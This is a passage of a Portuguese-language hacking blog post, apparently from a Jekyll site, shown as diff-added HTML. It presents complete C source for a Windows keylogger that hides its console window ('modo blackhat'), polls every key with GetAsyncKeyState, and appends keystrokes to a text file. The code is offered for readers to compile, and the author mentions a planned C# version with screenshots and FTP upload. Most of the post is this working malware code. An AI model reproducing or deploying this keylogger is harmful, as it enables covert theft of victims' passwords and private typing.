+<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">HWND</span> <span class="n">hidden</span><span class="p">;</span> <span class="c1">// blackhat na área kkk</span>
+    <span class="n">AllocConsole</span><span class="p">();</span>  
+    <span class="n">hidden</span> <span class="o">=</span> <span class="n">FindWindow</span><span class="p">(</span><span class="s">&quot;ConsoleWindowClass&quot;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">ShowWindow</span><span class="p">(</span><span class="n">hidden</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span></code></pre></div>
+
+<p>Para ficar mais blackhat vamos ocultar nossa janela :D fique com o código completo use o DevC++ pra compilar ou VS12 sei lá:</p>
+
+<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="c1">// Filename: keylogger.c </span>
+<span class="c1">//by: Mharcos Nesster</span>
+<span class="cp">#include &lt; stdio.h &gt;  </span>
+<span class="cp">#include &lt; windows.h &gt;  </span>
+ 
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">short</span> <span class="n">i</span><span class="p">;</span>  <span class="c1">// contador </span>
+    <span class="kt">short</span> <span class="n">keyState</span><span class="p">;</span>  <span class="c1">// comprar key</span>
+    <span class="n">HWND</span> <span class="n">hidden</span><span class="p">;</span> <span class="c1">// modo blackhat </span>
+    <span class="n">AllocConsole</span><span class="p">();</span>  <span class="c1">//  inicializa a entrada padrão: em modo Hidden lógico  também do Hearder Windows.h </span>
+    <span class="n">hidden</span> <span class="o">=</span> <span class="n">FindWindow</span><span class="p">(</span><span class="s">&quot;ConsoleWindowClass&quot;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span> <span class="c1">// agora sim </span>
+    <span class="n">ShowWindow</span><span class="p">(</span><span class="n">hidden</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>  <span class="c1">// call windows em modo Hidden (de mortal Kombat EHHEHEH)</span>
+ 
+    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">keyState</span> <span class="o">=</span> <span class="n">GetAsyncKeyState</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">(</span><span class="n">keyState</span> <span class="o">==</span> <span class="o">-</span><span class="mi">32767</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">Sleep</span><span class="p">(</span><span class="mi">30</span><span class="p">);</span>
+                <span class="kt">FILE</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
+                <span class="n">file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&quot;C:/Users/Marcos/Desktop/test.txt&quot;</span><span class="p">,</span> <span class="s">&quot;a+&quot;</span><span class="p">);</span>
+ 
+                <span class="k">if</span><span class="p">(</span><span class="n">file</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Erro ao criar o Arquivo test.txt.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+                    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+                <span class="p">}</span>
+ 
+                <span class="k">switch</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">case</span> <span class="nl">VK_SPACE</span><span class="p">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39; &#39;</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_SHIFT</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[SHIFT]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_RETURN</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[ENTER]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_BACK</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[BACKSPACE]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_TAB</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[TAB]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_CONTROL</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[CTRL]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_DELETE</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[DEL]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_OEM_1</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[;:]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_OEM_2</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[/?]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_OEM_3</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[`~]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_OEM_4</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[ [{ ]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_OEM_5</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[</span><span class="se">\\</span><span class="s">|]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_OEM_6</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[ ]} ]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_OEM_7</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[&#39;</span><span class="se">\&quot;</span><span class="s">]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="mi">187</span><span class="o">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;+&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="mi">188</span><span class="o">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;,&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="mi">189</span><span class="o">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;-&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="mi">190</span><span class="o">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;.&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_NUMPAD0</span><span class="p">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;0&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_NUMPAD1</span><span class="p">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;1&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_NUMPAD2</span><span class="p">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;2&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_NUMPAD3</span><span class="p">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;3&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_NUMPAD4</span><span class="p">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;4&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_NUMPAD5</span><span class="p">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;5&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_NUMPAD6</span><span class="p">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;6&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_NUMPAD7</span><span class="p">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;7&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_NUMPAD8</span><span class="p">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;8&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_NUMPAD9</span><span class="p">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="sc">&#39;9&#39;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="nl">VK_CAPITAL</span><span class="p">:</span>
+                    <span class="n">fputs</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">[CAPS LOCK]</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                    <span class="k">break</span><span class="p">;</span>
+                    <span class="k">default</span><span class="o">:</span>
+                    <span class="n">fputc</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
+                    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></div>
+
+<img src="https://dl.dropboxusercontent.com/u/97321327/keylogger2.png" />
+<p>Eu modifiquei pra mostrar a janela, só pra demostração  mesmo, é um keylogger simples tou fazendo um em C#  avançado Screenshot e FTP, por em quanto pra quem quiser começar também uma dica de como usar a função em c#: vale a pena aprender C# as vezes IDE é bom pra desenvolver coisa que funcione bem em ambiente Windows C# é ótimo pra isso. </p>
+<pre class="code">
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
+public static extern short GetAsyncKeyState(int vkey);
+</pre>
+</stdio.h></p>
+
+	  </div>
+
+		
+		<ul class="tag_box list-unstyled list-inline">
+		  <li><i class="fa fa-folder-open"></i></li>
+		  
+		  
+			 
+				<li><a href="/categories.html#c programming-ref">
+					c programming <span>(7)</span>
+					
+				</a></li>
+			
+		  
+		</ul>
+		  
+
+		
+		<ul class="list-inline">
+		  <li><i class="fa fa-tags"></i></li>
+		  
+		  
+			 
+				<li>
+					<a href="/tags.html#c-ref">
+					c <span>(1)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="/tags.html#keylogger-ref">
+					keylogger <span>(1)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="/tags.html#windows-ref">
+					windows <span>(3)</span>
+					
+					</a>
+				</li>
+			
+		  
+		  
+		</ul>
+		  
+
+		<hr>
+
+		<div>
+      <section class="share col-sm-6">
+        <h4 class="section-title">Share Post</h4>
+        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=Escrevendo Um Keylogger em C 0xc5&via=mh4x0f"
+           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+          <i class="fa fa-twitter fa-lg"></i>
+          Twitter
+        </a>
+        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
+           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+          <i class="fa fa-facebook fa-lg"></i>
+          Facebook
+        </a>
+        <a class="btn btn-default btn-sm gplus"
+           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
+          <i class="fa fa-google-plus fa-lg"></i>
+          Google+
+        </a>
+      </section>
+
+      <section class="col-sm-6 author">
+        <img src="http://avatars.githubusercontent.com/u/6795613" style="width:80px;height:80px;" class="img-rounded author-image" />
+        <h4 class="section-title author-name">mh4x0f</h4>
+        <p class="author-bio">One 0x41414141 worth a thousand words</p>
+      </section>
+    </div>
+
+    <div class="clearfix"></div>
+
+		<ul class="pager">
+		  
+		  <li class="previous"><a href="/cracking/2014/07/06/Engenharia%20Reversa%20crackeando%20Software%20na%20Unha%200x01.html" title="Engenharia Reversa [Basic]">&larr; Previous</a></li>
+		  
+		  
+		  <li class="next"><a href="/assembly/2014/07/28/Convert%20binario,hexdecimal%20and%20asm%20jmp%20assembly.html" title="Convert binario,hexdecimal and asm jmp assembly">Next &rarr;</a></li>
+		  
+		</ul>
+
+		<hr>
+	</div>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+    
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = 'mh4x0fblog';
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+
+
+
+		<footer>
+			<hr/>
+			<p>
+				&copy; 2015 mh4x0f with Jekyll. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+			</p>
+		</footer>
+	</div>
+
+	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
+	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="/assets/js/app.js"></script>
+</body>
+</html>
+
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  var _gaq = _gaq || [];
+  var pluginUrl =
+ '//www.google-analytics.com/plugins/ga/inpage_linkid.js';
+  _gaq.push(['_require', 'inpage_linkid', pluginUrl]);
+  _gaq.push(['_setAccount', 'mh4x0f']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+
